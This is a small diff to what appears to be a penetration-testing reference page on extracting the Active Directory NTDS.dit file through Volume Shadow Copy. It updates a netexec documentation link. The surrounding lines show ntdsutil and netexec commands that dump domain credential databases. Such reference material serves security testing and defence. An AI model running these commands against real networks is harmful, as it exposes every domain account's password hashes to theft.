@@ -48,7 +48,7 @@ The VSS is a Windows service that allows users to create snapshots or backups of
   ```powershell
   ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
   ```
-* [netexec VSS module](https://wiki.porchetta.industries/smb-protocol/obtaining-credentials/dump-ntds.dit)
+* [netexec VSS module](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit)
   ```powershell
   nxc smb 10.10.0.202 -u username -p password --ntds vss
   ```
